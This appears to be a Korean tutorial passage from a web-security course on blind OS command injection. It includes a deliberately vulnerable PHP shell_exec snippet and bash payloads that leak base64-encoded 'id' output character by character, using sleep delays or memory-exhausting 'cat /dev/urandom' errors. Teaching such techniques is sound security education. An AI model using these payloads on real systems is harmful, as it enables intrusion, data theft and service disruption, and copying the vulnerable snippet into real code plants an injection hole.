실행 결과를 확인할 수 없는 환경 - II :
    Network In/Out Bound가 막혀 있고 파일로 출력 값을 redirection시켜 결과를 확인 할 수 없는 상황에서는 참/거짓 판별로 데이터를 추출해야 합니다.

    비교문을 통해 데이터를 비교하고, 참/거짓을 판별할 수 있는 방법이 있으면 됩니다.

    1) 지연 시간 (Sleep)
        비교 하는 값이 참일 경우 sleep 명령어를 통해 지연시간을 발생시켜 확인합니다.

    2) 에러 (DoS)
        비교하는 값이 참일 경우 시스템 에러를 발생시켜 500 코드(또는 서버 에러를 뜻하는 HTTP 상태 코드)를 확인합니다.

    밑은 아래 php코드와 같이 OS 커맨드 실행 결과가 사용자에게 반환되지 않으며,
    앞서 배운 Network In/Out Bound, File 등의 방법들이 제한된 상황에서 사용할 수 있는 예시입니다.
    ex)
        <?php
            $x = $_GET['cmd'];
            shell_exec($x);

1) 지연 시간 (Sleep)
    id명령어의 결과를 확인하고 싶을 때 해당 데이터를 base64로 치환한 후 참/거짓 판별을 통해 해당 데이터를 알아낼 수 있습니다.
    ex)
        $ id 
        uid=33(www-data) gid=33(www-data) groups=33(www-data)
        $ id | base64 -w 0
        dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK

    참/거짓 여부는 바이트 한 개가 입력 값과 일치할 때 sleep명령어를 통해 서버 응답을 지연시켜 알아낼 수 있습니다.
    ex)
        bash -c "a=\$(id | base64 -w 0); if [ \${a:0:1} == 'd' ]; then sleep 2; fi;" # --> sleep for 2 seconds; true
        bash -c "a=\$(id | base64 -w 0); if [ \${a:1:1} == 'W' ]; then sleep 2; fi;" # --> sleep for 2 seconds; true
        bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'a' ]; then sleep 2; fi;" # --> sleep for 0 seconds; false
        bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'l' ]; then sleep 2; fi;" # --> sleep for 2 seconds; true

2) 에러 (DoS)
    id명령어의 결과를 확인하고 싶을 때 해당 데이터를 base64로 치환한 후 참/거짓 판별을 통해 해당 데이터를 알아낼 수 있습니다.

    sleep 명령을 사용할 수 없거나, 시간 지연을 확실히 판별하기 어려운 경우
    HTTP 500 에러(Internal Server Error)를 인위적으로 발생시키는 방법을 통해 참/거짓 판별을 할 수 있습니다.

    다양한 방법이 존재하며, 간단한 방법으로는 cat /dev/urandom 명령어가 있습니다.
    해당 명령어를 실행시키면 아래와 같이 할당된 메모리를 초과하는 에러를 발생시킬 수 있습니다.
    ex)
        2020/05/27 09:46:14 [error] 1572#1572: *297 FastCGI sent in stderr: 
        "PHP message: PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 98566176 bytes) 
        in /var/www/html/x.php on line 6" while reading response header from upstream, client: 183.98.35.161, server: demo.dreamhack.io, 
        request: "GET /m.php?cmd=bash%20-c%20%22printenv;a=\$(id%20|%20base64%20-w%200);%20if%20[%20\${a:0:1}%20==%20%27z%27%20];
        %20then%20sleep%202;%20fi;%22;%20echo%201;cat%20/dev/urandom HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.2-fpm.sock:", 
        host: "demo.dreamhack.io"
    ex)
        bash -c "a=\$(id | base64 -w 0); if [ \${a:0:1} == 'd' ]; then cat /dev/urandom; fi;" # --> 500 true
        bash -c "a=\$(id | base64 -w 0); if [ \${a:1:1} == 'W' ]; then cat /dev/urandom; fi;" # --> 500 true
        bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'a' ]; then cat /dev/urandom; fi;" # --> 200 false
        bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'l' ]; then cat /dev/urandom; fi;" # --> 500 true































